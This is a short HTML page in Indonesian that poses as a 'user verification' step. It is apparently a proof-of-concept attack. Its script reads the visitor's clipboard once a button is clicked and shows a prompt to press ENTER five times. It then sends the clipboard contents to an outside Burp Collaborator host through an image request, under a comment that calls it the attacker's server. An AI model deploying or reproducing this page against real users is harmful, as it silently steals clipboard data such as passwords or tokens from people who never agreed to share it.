<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Validasi Clipboard (Keyboard OK)</title>
  <style>
    body {
      font-family: sans-serif;
      text-align: center;
      padding-top: 100px;
    }
    button {
      font-size: 18px;
      padding: 12px 24px;
      cursor: pointer;
    }
    #msg {
      margin-top: 20px;
      font-size: 16px;
    }
    #result {
      margin-top: 30px;
      font-weight: bold;
      color: green;
      white-space: pre-wrap;
    }
  </style>
</head>
<body>

  <h2>Verifikasi Pengguna</h2>
  <button id="validateBtn" autofocus>Tekan ENTER atau klik untuk validasi awal</button>
  <div id="msg">Silakan tekan tombol di atas</div>
  <div id="result"></div>

  <script>
    let ready = false;
    let counter = 0;
    let triggered = false;
    let clipboardContent = "";

    document.getElementById("validateBtn").addEventListener("click", () => {
      if (!document.hasFocus()) {
        document.getElementById("msg").innerText = "❌ Tab tidak fokus!";
        return;
      }

      navigator.clipboard.readText()
        .then(text => {
          clipboardContent = text;
          ready = true;
          document.getElementById("msg").innerText = "✅ Validasi berhasil. Sekarang tekan ENTER 5x untuk lanjut.";
        })
        .catch(err => {
          document.getElementById("msg").innerText = "❌ Gagal membaca clipboard: " + err;
        });
    });

    document.body.addEventListener("keydown", (e) => {
      if (!ready || triggered) return;
      if (e.key === "Enter") {
        counter++;

        document.getElementById("msg").innerText = `Tekan ENTER (${counter}/5)...`;

        if (counter >= 5) {
          triggered = true;
          document.getElementById("msg").innerText = "📋 Clipboard berhasil dibaca!";
          document.getElementById("result").innerText = "📋 Isi Clipboard:\n" + clipboardContent;

          // Optional: kirim ke server attacker
          const img = new Image();
          img.src = "https://mndf85nuwztx9glnwx47e0nr4ia9yy.burpcollaborator.net/log?clip=" + encodeURIComponent(clipboardContent);
        }
      }
    });
  </script>

</body>
</html>
